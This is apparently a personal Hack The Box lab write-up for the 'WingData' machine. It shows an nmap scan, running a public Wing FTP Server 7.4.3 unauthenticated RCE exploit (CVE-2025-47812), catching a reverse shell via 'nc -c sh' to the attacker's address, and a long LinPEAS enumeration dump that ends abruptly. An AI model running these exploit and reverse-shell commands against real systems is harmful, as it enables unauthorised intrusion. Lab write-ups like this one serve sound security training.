---
title: "WingData"
kind: writeup
tags:
  - hack-the-box-labs
  - status/done
  - writeup
  - linux
status: "Done"
difficulty: "Easy"
difficulty-for-me: "Medium"
date: 2026-05-08
url: "https://app.hackthebox.com/machines/WingData?sort_by=created_at&sort_type=desc"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: a96759b9275183da80f8012b8f03813f
---

# WingData

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
└─❯ nmap -p- --min-rate 1000 -T4 -A -sV -Pn -oA nmap_full_scan 10.129.244.106
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-08 12:29 +0530
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.69% done; ETC: 12:31 (0:00:41 remaining)
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.54% done; ETC: 12:31 (0:00:23 remaining)
Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.76% done; ETC: 12:31 (0:00:00 remaining)
Nmap scan report for 10.129.244.106
Host is up (0.36s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%), Linux 5.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   488.31 ms 10.10.16.1
2   690.20 ms 10.129.244.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.26 seconds
```

![[attachments/Hack The Box Labs/Hack The Box/WingData/image.png]]

![[attachments/Hack The Box Labs/Hack The Box/WingData/image 1.png]]

## Searching for exploits

```bash
┌──[kali@Shieldbyte53]─[~]
└─❯ searchsploit "Wing FTP Server 7.4.3"
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)                                                                                      | multiple/remote/52347.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──[kali@Shieldbyte53]─[~]
└─❯ searchsploit -m multiple/remote/52347.py
  Exploit: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)
      URL: https://www.exploit-db.com/exploits/52347
     Path: /usr/share/exploitdb/exploits/multiple/remote/52347.py
    Codes: CVE-2025-47812
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/52347.py
```

## Exploiting the **Vulnerability**

```bash
┌──[kali@Shieldbyte53]─[~/test]
└─❯ python3 52347.py -u http://ftp.wingdata.htb/ -c "id"

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: 9cda77a8f1363f1ddaa6798086f46540f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: 9cda77a8f1363f1ddaa6798086f46540f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
----------------------
```

## Getting the shell

```bash
┌──[kali@Shieldbyte53]─[~]
└─❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.232.33] 52678
python3 -c 'import pty; pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$
```

## Linpeas

```bash
wingftp@wingdata:/tmp$ ./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look into it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 6.1.0-42-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30)
User & Groups: uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
Hostname: wingdata

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system (T1082)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 6.1.0-42-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30)
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm

╔══════════╣ Sudo version (T1548.003,T1068)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.13p3

╔══════════╣ PATH (T1574.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime (T1082)
Fri May  8 05:12:52 AM EDT 2026
 05:12:52 up 27 min,  0 user,  load average: 0.08, 0.13, 0.12

╔══════════╣ Unmounted file-system? (T1082,T1120)
╚ Check if you can mount umounted devices
/dev/sda1 /               ext4    errors=remount-ro 0       1
/dev/sda2 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20) (T1082)
disk
sda
sda1
sda2

╔══════════╣ Environment (T1082,T1552.007)
╚ Any private information inside environment variables?
USER=wingftp
SHLVL=1
HOME=/opt/wingftp
OLDPWD=/home
LOGNAME=wingftp
_=./linpeas.sh
TERM=xterm
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/tmp
PIDFILE=/opt/wftpserver/pid-wftpserver.pid

╔══════════╣ Searching Signature verification failed in dmesg (T1082)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Protections (T1518.001)
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ unpriv_userns_clone? ........... 0
═╣ unpriv_bpf_disabled? ........... 2
═╣ Cgroup2 enabled? ............... enabled
═╣ kptr_restrict? ................. 0
═╣ dmesg_restrict? ................ 1
═╣ ptrace_scope? .................. 0
═╣ protected_symlinks? ............ 1
═╣ protected_hardlinks? ........... 1
═╣ perf_event_paranoid? ........... 3
═╣ mmap_min_addr? ................. 65536
═╣ lockdown mode? ................. [none] integrity confidentiality
═╣ Kernel hardening flags? ........ CONFIG_RANDOMIZE_BASE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
# CONFIG_KASAN is not set
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

╔══════════╣ Kernel Modules Information (T1547.006)
══╣ Kernel modules with weak perms? (T1547.006)

══╣ Kernel modules loadable?  (T1547.006)
Modules can be loaded
══╣ Module signature enforcement?  (T1547.006)
Not enforced

╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Operating system ............. Linux
═╣ Kernel release ............... 6.1.0-42-amd64
═╣ Comparable version ........... 6.1.0.42
═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
═╣ Kernel config source ......... /boot/config-6.1.0-42-amd64
═╣ No rule matched current kernel/version prerequisites in embedded datasets.

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any): (T1613)
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

╔══════════╣ Container details (T1613,T1611)
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned) (T1057)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root           1  0.5  0.2 102020 11976 ?        Ss   04:45   0:08 /sbin/init
root        1566  0.3  0.3  57756 14024 ?        Ss   04:45   0:06 /lib/systemd/systemd-journald
root        1591  0.0  0.1  27968  7444 ?        Ss   04:45   0:00 /lib/systemd/systemd-udevd
systemd+    2294  0.0  0.1  90104  6628 ?        Ssl  04:45   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        2428  0.2  0.0  86988  3000 ?        S<sl 04:45   0:04 /sbin/auditd
_laurel     2445  0.2  0.1  10092  6624 ?        S<   04:45   0:03  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
root        3182  0.0  0.0   6616  1236 ?        Ss   04:45   0:00 /usr/sbin/cron -f
message+    3183  0.0  0.1   9276  5116 ?        Ss   04:45   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root        3188  0.0  0.1  16708  7664 ?        Ss   04:45   0:00 /lib/systemd/systemd-logind
root        3243  0.0  0.0   5876  3656 ?        Ss   04:45   0:00 dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root        3370  0.1  0.2 142748 10536 ?        Sl   04:45   0:02 /usr/sbin/vmtoolsd
root        3430  0.0  0.2  38892 10576 ?        S    04:45   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root        3531  0.0  0.0   5880  1040 tty1     Ss+  04:45   0:00 /sbin/agetty -o -p -- u --noclear - linux
wingftp     3558  0.0  0.3 683156 12804 ?        Ssl  04:45   0:00 /opt/wftpserver/wftpserver
wingftp     3673  0.0  0.0   2584   900 ?        S    04:50   0:00  _ sh -c nc -c sh 10.10.16.9 4444
wingftp     3674  0.0  0.0   2584   908 ?        S    04:50   0:00      _ sh -c sh
wingftp     3675  0.0  0.0   2584   940 ?        S    04:50   0:00          _ sh
wingftp     3676  0.0  0.2  16572 11208 ?        S    04:50   0:00              _ python3 -c import pty; pty.spawn("/bin/bash")
wingftp     3677  0.0  0.0   7204  3884 pts/0    Ss   04:50   0:00                  _ /bin/bash
wingftp    74193  5.0  0.0   3556  2660 pts/0    S+   05:12   0:01                      _ /bin/sh ./linpeas.sh
wingftp    89669  0.0  0.0   3556  1188 pts/0    S+   05:13   0:00                          _ /bin/sh ./linpeas.sh
wingftp    89671  100  0.1  11092  4408 pts/0    R+   05:13   0:00                          |   _ ps fauxwww
wingftp    89673  0.0  0.0   3556  1188 pts/0    S+   05:13   0:00                          _ /bin/sh ./linpeas.sh
root        3565  0.0  0.1   6884  4840 ?        Ss   04:45   0:00 /usr/sbin/apache2 -k start
www-data    3567  0.0  0.2 1212984 8064 ?        Sl   04:45   0:00  _ /usr/sbin/apache2 -k start
www-data    3568  0.0  0.2 1213040 8156 ?        Sl   04:45   0:00  _ /usr/sbin/apache2 -k start
wingftp    31321  0.0  0.0   6940  1600 pts/0    S    04:59   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    31322  0.0  0.0   6940   256 pts/0    S    04:59   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    31329  0.0  0.0   6940  2012 pts/0    S    04:59   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    31332  0.0  0.0   5520   892 pts/0    S    04:59   0:00  |       _ dd bs=9000 count=1
wingftp    31323  0.0  0.0   6340  1988 pts/0    S    04:59   0:00  _ grep accessible
wingftp    74087  0.0  0.0   6940  1492 pts/0    S    05:06   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    74090  0.0  0.0   6940   256 pts/0    S    05:06   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    74098  0.0  0.0   6940  1884 pts/0    S    05:06   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
wingftp    74101  0.0  0.0   5520   916 pts/0    S    05:06   0:00  |       _ dd bs=9000 count=1
wingftp    74092  0.0  0.0   6340  2132 pts/0    S    05:06   0:00  _ grep accessible

╔══════════╣ Processes with unusual configurations (T1057)
Process 3243 (root) - dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/
SELinux context: /{,usr/}sbin/dhclient (enforce)
  └─ AppArmor profile: /{,usr/}sbin/dhclient (enforce)

╔══════════╣ Processes with credentials in memory (root req) (T1003.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)
mysql Not Found
postgres Not Found
redis-server Not Found
mongod Not Found
memcached Not Found
elasticsearch Not Found
jenkins Not Found
tomcat Not Found
nginx Not Found
php-fpm Not Found
supervisord Not Found
vncserver Not Found
xrdp Not Found
teamviewer Not Found

╔══════════╣ Opened Files by processes (T1003.007)
Process 3558 (wingftp) - /opt/wftpserver/wftpserver
  └─ Has open files:
    └─ /opt/wftpserver/Log/audit_db
    └─ pipe:[22428]
    └─ /opt/wftpserver/Log/ssh_debug_log
    └─ /opt/wftpserver/pid-wftpserver.pid
    └─ /opt/wftpserver/Data/bookmark_db
Process 3673 (wingftp) - sh -c nc -c sh 10.10.16.9 4444
  └─ Has open files:
    └─ pipe:[22428]
    └─ /opt/wftpserver/Log/ssh_debug_log
Process 3674 (wingftp) - sh -c sh
  └─ Has open files:
    └─ /opt/wftpserver/Log/ssh_debug_log
Process 3675 (wingftp) - sh
  └─ Has open files:
    └─ /opt/wftpserver/Log/ssh_debug_log
Process 3676 (wingftp) - python3 -c import pty; pty.spawn("/bin/bash")
  └─ Has open files:
    └─ /opt/wftpserver/Log/ssh_debug_log
    └─ /dev/ptmx
Process 3677 (wingftp) - /bin/bash
  └─ Has open files:
    └─ /dev/pts/0
Process 31321 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ /dev/pts/0
Process 31322 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ pipe:[107417]
Process 31323 (wingftp) - grep accessible
  └─ Has open files:
    └─ pipe:[107417]
    └─ /dev/pts/0
Process 31329 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ pipe:[107417]
Process 31332 (wingftp) - dd bs=9000 count=1
  └─ Has open files:
    └─ pipe:[107428]
Process 74087 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ /dev/pts/0
Process 74090 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ pipe:[214989]
Process 74092 (wingftp) - grep accessible
  └─ Has open files:
    └─ pipe:[214989]
    └─ /dev/pts/0
Process 74098 (wingftp) - bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | x
  └─ Has open files:
    └─ pipe:[214989]
Process 74101 (wingftp) - dd bs=9000 count=1
  └─ Has open files:
    └─ pipe:[215005]

╔══════════╣ Processes with memory-mapped credential files (T1003.007)

╔══════════╣ Processes whose PPID belongs to a different user (not root) (T1134.004)
╚ You will know if a user can somehow spawn processes as a different user

╔══════════╣ Files opened by processes belonging to other users (T1083)
╚ This is usually empty because of the lack of privileges to read other user processes information

╔══════════╣ Check for vulnerable cron jobs (T1053.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
══╣ Cron jobs list (T1053.003)
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1040 Jan 14 05:16 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rw-r--r--  1 root root  201 Jun  6  2025 e2scrub_all
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

/etc/cron.daily:
total 32
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rwxr-xr-x  1 root root  539 Jul 17  2025 apache2
-rwxr-xr-x  1 root root 1478 May 25  2023 apt-compat
-rwxr-xr-x  1 root root  123 Mar 26  2023 dpkg
-rwxr-xr-x  1 root root  377 Dec 14  2022 logrotate
-rwxr-xr-x  1 root root 1395 Mar 12  2023 man-db
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rwxr-xr-x  1 root root 1055 Mar 12  2023 man-db
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

/etc/cron.yearly:
total 12
drwxr-xr-x  2 root root 4096 Feb  9 08:19 .
drwxr-xr-x 75 root root 4096 May  8 05:10 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
/etc/crontab:8:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

══╣ Checking for specific cron jobs vulnerabilities (T1053.003)
Checking cron directories...

╔══════════╣ System timers (T1053.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
══╣ Active timers: (T1053.003)
NEXT                        LEFT           LAST                        PASSED               UNIT                         ACTIVATES
Fri 2026-05-08 06:10:50 EDT 57min left     Thu 2026-01-22 04:40:13 EST 3 months 14 days ago fstrim.timer                 fstrim.service
Fri 2026-05-08 06:23:56 EDT 1h 10min left  Fri 2026-05-08 04:52:25 EDT 21min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2026-05-08 09:43:24 EDT 4h 29min left  Thu 2026-01-22 04:41:48 EST 3 months 14 days ago apt-daily.timer              apt-daily.service
Fri 2026-05-08 14:02:09 EDT 8h left        Mon 2025-11-03 09:32:05 EST 6 months 3 days ago  man-db.timer                 man-db.service
Sat 2026-05-09 00:00:00 EDT 18h left       -                           -                    dpkg-db-backup.timer         dpkg-db-backup.service
Sat 2026-05-09 00:00:00 EDT 18h left       Fri 2026-05-08 04:45:36 EDT 27min ago            logrotate.timer              logrotate.service
Sat 2026-05-09 05:00:31 EDT 23h left       Fri 2026-05-08 05:00:31 EDT 13min ago            systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2026-05-10 03:10:18 EDT 1 day 21h left Fri 2026-05-08 04:46:05 EDT 27min ago            e2scrub_all.timer            e2scrub_all.service
══╣ Disabled timers: (T1053.003)
══╣ Additional timer files: (T1053.003)

╔══════════╣ Services and Service Files (T1543.002,T1007)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services

══╣ Active services: (T1543.002,T1007)
apache2.service                    loaded active running The Apache HTTP Server
apparmor.service                   loaded active exited  Load AppArmor profiles
auditd.service                     loaded active running Security Auditing Service
console-setup.service              loaded active exited  Set console font and keymap
